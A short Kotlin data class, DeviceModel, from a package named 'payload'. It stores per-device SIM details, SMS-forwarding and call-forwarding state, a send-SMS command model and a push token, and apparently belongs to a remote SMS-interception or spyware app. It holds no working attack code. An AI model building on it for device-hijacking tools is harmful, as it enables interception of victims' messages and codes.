package com.payload.jansiix0ne.models

data class DeviceModel(
    val id: Long = 0L,
    val mobilename: String = "",
    val deviceid: String = "",
    val charge: String = "",
    val userInfo: UserModel? = null,
    val simModel: SimModel? = null,
    val forwarding: Smsforward? = null,
    val callForwardStatus: Boolean? = null,
    val lastOnline: Long? = null,
    val send_sms: SendSmsModel? = null,
    val fcmToken: String? = null
)
